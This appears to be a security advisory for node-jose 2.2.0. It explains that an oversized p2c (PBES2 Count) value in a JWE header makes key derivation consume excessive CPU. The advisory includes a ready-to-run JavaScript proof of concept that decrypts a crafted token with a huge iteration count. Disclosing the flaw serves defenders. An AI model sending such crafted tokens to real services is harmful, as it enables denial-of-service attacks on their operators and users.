# Dos in Node-Jose

## Summary

node-jose 2.2.0 allow attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value in a JOSE header.

### Details

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack

### PoC

```js
var jose = require("node-jose")
keystore = jose.JWK.createKeyStore();

keystore.add('{"alg":"PBES2-HS256+A128KW","kty":"oct", "k":"YXNk", "use":"enc"}').
then(function(result) {
    console.log(result)
});
jose.JWE.createDecrypt(keystore).
decrypt(JSON.parse('{"ciphertext":"CS4iMkMe98G9JCm_GHBY2hZvwHVO0URRekqErGK_gWo","encrypted_key":"zfkm7JbeK8b8fV32s8Cjd9Ke5ApvwkuWstP6V5uQjEFbsngNIRxQr6Y_dOKqENeCqrFb97YyT5466vz8A9iSjzaYMjx_ZsQ_","header":{"p2c":200000000,"p2s":"bI-cn3yKFoYn9it6VuJYmg"},"iv":"b8mAOAnIJkWKPyKTHF2hww","protected":"eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwidHlwIjoiSldFIiwgInAyYyI6MjAwMDAwMDAsICJwMnMiOiJRVUZCUVVGQlFVRT0ifQ==","tag":"zkH2NrZhgzSBG-fdrdJkOyuScH6K4RBBDMm2Es7O6vM"}')).
then(function(result) {
    console.log(result)
});
```

